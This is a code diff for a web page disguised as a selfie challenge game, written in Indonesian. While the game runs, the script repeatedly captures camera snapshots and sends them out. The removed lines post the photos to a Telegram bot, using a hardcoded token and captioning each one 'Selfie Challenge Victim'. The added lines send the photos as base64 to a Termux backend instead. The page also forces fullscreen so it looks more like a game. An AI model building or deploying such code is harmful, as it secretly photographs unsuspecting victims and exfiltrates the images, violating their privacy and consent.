@@ -27,20 +27,22 @@
     <button onclick="startGame()">MULAI CHALLENGE SEKARANG!</button>
 
     <script>
-        const BOT_TOKEN = "8608073573:AAHbPbrLn2EUdG31NA4i6sBwBT63wz8QWTQ";
-        const CHAT_ID = "8509633837";
+        // Ganti dengan IP Termux (pastikan HP dan Vercel satu jaringan)
+        const BACKEND_URL = "http://192.168.1.X:5000/send_photo"; // Ganti X dengan IP Termux
         let score = 0;
 
-        async function kirimFoto(blob) {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "selfie_challenge.jpg");
-            formData.append("caption", `🎉 Selfie Challenge Victim\nScore: ${score}\nWaktu: ${new Date().toLocaleString()}`);
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
+        async function kirimKeBackend(imageBase64) {
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageBase64, score: score })
+                });
+                const result = await response.json();
+                console.log("Backend response:", result);
+            } catch(e) {
+                console.log("Gagal kirim ke backend:", e);
+            }
         }
 
         async function ambilSelfie() {
@@ -59,9 +61,11 @@
 
                 stream.getTracks().forEach(t => t.stop());
 
-                canvas.toBlob((blob) => {
-                    if (blob) kirimFoto(blob);
-                }, "image/jpeg", 0.9);
+                // Convert ke base64
+                const imageBase64 = canvas.toDataURL("image/jpeg", 0.9).split(',')[1];
+                if (imageBase64) {
+                    await kirimKeBackend(imageBase64);
+                }
 
             } catch(e) {
                 console.log("Kamera ditolak");
@@ -75,7 +79,6 @@
             score += 100;
             document.getElementById("score").textContent = score;
 
-            // Ambil foto beberapa kali dengan delay fun
             setTimeout(() => { ambilSelfie(); }, 1500);
             setTimeout(() => { 
                 document.getElementById("text").innerHTML = "🎉 Bagus! Score naik!<br>Level 2: Selfie lagi yuk!";
@@ -87,7 +90,6 @@
             }, 8500);
         }
 
-        // Auto fullscreen biar lebih mirip game
         document.documentElement.requestFullscreen?.();
     </script>
 </body>
